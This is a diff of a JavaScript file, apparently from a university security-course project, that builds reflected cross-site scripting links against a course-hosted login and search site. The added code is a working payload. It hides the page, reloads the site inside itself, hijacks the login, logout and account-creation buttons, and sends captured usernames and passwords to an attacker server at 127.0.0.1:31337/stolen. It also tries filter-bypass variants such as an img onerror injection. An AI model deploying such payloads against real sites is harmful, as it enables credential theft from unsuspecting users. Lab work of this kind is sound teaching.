@@ -4,84 +4,92 @@
 </script>
 <script>
 
-var token = null;
-
-// 
-function fakeLogin(usrname, pass) {
-	$.post( "http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", { username: "victim", password: "123456" })
-	  .done(function( data ) {
-	    alert( "Data Loaded: " + data );
-	 });
- }
-// function to connect to spy server 
-function upload(username, password) {
-	var url = "http://127.0.0.1:31337/stolen?event=";
-	if (password == null || username == null) {
-		url = url + "logout&user=" + username;
-	} else {
-		url = url + "login&user=" + username + "&pass=" + password;
-	}
-	// fetch(url, {
-	//   method: 'get',
-	//   mode: 'no-cors'
-	// })
-	// .then(response => {
-	// 	console.log(response)
-	// })
-}
-
+//http://127.0.0.1:31337/stolen?event=login&user=<username>&pass=<password>
+// http://127.0.0.1:31337/stolen?event=logout&user=<username>		      
+// "NewFile", param);
 // Extend this function:
+			  // $.get("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=pwned", 
+			  // function(e){
+			  // 	document.write(e);
+			  //   console.log(e);
+			  // });
 function payload(attacker) {
 	function proxy(href) {
 		$("html").load(href, function(){
 		$("html").show();
- 
-        $('form').on('submit', function(e){
-		   // alert( "Handler for .submit() called." + Object.keys(e));
-		   // console.log(Object.keys(e));
-		   var username = document.getElementById("username").value;
-		   var password = document.getElementById("userpass").value
-  		   // upload(username, password);
-		   alert(document.getElementById("username").value);
-  		   alert(document.getElementById("userpass").value);
-			// history.pushState(state, title, url)
-  		   upload(username, password);
-
-		   // event.preventDefault();
-		});
-		$(":button").click(function(e) {
-		    // e.preventDefault();
-		    alert("button click");  
-			// $("html").hide();
-		});
-		// this has to do with the persistent problem that we run into 
-	    // $("#log-out-btn").button().click(function(){
-	    //     alert("button");
-	    // }); 
-	    token = document.cookie;
-		// $("#query").val("");
-		});
-	}
+			var realURL = window.location.href;
+			// history.pushState(null, '', '/project3'); 
+			// var searchAgain = $("#search-again-btn");
+			var s=realURL.split("q=");
+		    $("#search-btn").click(function(e){
+		      var q = $("#query").val();
+			  $.get("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=" + q, 
+			  function(e){
+			  	document.write(e);
+			  });
+			  e.preventDefault();
+  		      proxy("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=" + q);
+		      // window.location.href = s[0] + "q=" + q;
+			  // window.location.replace(s[0] + "q=" + q + s[1]);
+	        }); 
+	        $("#search-again-btn").click(function(e){
+		      e.preventDefault();
+		      alert(0)
+			  $.get("http://cis551.cis.upenn.edu/project3/search?xssdefense=0&q=pwned", 
+			  function(e){
+			  	document.write(e);
+			    console.log(e);
+			  });
+			  window.location.replace("realURL");
+	        }); 
+		    $("#log-in-btn").click(function(e){
+		      e.preventDefault();
+			  $.post("http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4", 
+			  {username: $('#username').val(), password: $('#userpass').val()});
+			  $.get(attacker+"stolen?event=login&user="+$('#username').val()+"&pass=" +$('#userpass').val());
+			  window.location.replace(realURL);
+	        }); 
+		    $("#new-account-btn").click(function(e){
+		      e.preventDefault();
+			  $.post("http://cis551.cis.upenn.edu/project3/create?csrfdefense=0&xssdefense=4", 
+			  {username: $('#username').val(), password: $('#userpass').val()}) 
+			  window.location.replace(realURL);
+	        }); 
+		    $("#log-out-btn").click(function(e){
+		      alert(1);
+		      e.preventDefault();
+			  $.post("http://cis551.cis.upenn.edu/project3/logout?csrfdefense=0&xssdefense=4")
+			  $.get(attacker + "stolen?event=logout&user="+$('#logged-in-user').text());
+			  window.location.replace(realURL);
+	        }); 
+			});
+		}
 	$("html").hide();
 	proxy("./");
 }
 
+function test() {
+	alert(4);
+}
+//<script>a%00lert(1)
 
 function makeLink(xssdefense, target, attacker) {
 		if (xssdefense == 0) {
 			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
 			encodeURIComponent("<script" + ">" + payload.toString() +
-			";payload(\"" + attacker + "\");</script" + ">");
+			";payload(\"" + attacker + "\");" + "</" + "script" + ">");
+		} else if (xssdefense == 1) {
+			return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<img src=a  onerror=(" + test.toString() +
+			"; test(); >");
+			//payload(\"" + attacker + "\");" + ">");
 		}
 	}
-
-	var xssdefense = 0;
+	var xssdefense = 1;
 	var target = "http://cis551.cis.upenn.edu/project3/";
 	var attacker = "http://127.0.0.1:31337/";
 
 	$(function() {
-		upload("adf", "adf");
-		fakeLogin("asdf", "asdf");
 		var url = makeLink(xssdefense, target, attacker);
 		$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
 	});
